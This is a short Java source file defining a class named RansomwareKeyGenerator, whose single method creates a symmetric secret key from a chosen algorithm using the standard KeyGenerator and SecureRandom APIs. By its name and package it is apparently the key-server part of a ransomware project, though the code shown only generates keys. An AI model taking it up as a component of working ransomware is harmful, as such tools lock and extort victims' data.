package server.keys;

import java.security.Key;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;

import server.exceptions.AlgorithmNotFoundException;

public class RansomwareKeyGenerator {
	public SecretKey generateKey(String chosenAlgorithm) throws AlgorithmNotFoundException {

		// Creating a KeyGenerator object
		KeyGenerator keyGen = null;

		try {
			keyGen = KeyGenerator.getInstance(chosenAlgorithm);
			// Creating a SecureRandom object
			SecureRandom secRandom = new SecureRandom();

			// Initializing the KeyGenerator
			keyGen.init(secRandom);

			// Generating a key
			return keyGen.generateKey();
			
		} catch (NoSuchAlgorithmException e) {
			e.printStackTrace();
		}

		throw new AlgorithmNotFoundException();

	}

}
